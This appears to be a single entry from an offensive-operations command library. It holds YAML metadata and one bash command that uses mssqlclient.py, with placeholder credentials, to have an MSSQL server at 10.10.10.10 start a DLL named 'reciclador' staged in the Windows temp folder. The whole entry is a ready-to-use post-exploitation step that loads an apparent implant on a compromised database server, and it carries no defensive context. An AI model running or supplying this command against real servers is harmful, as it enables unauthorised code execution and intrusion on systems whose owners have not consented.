---
id: 202a16ef-6291-410f-9821-aa183792f0b6
name: Start Reciclador
type: command
executor: bash
data: python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador
  'C:\windows\temp\reciclador.dll'
output: null
created_at: '2023-04-06T03:56:20.471830+00:00'
updated_at: '2023-04-10T20:36:31.774363+00:00'
---

# Start Reciclador

```bash
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
```
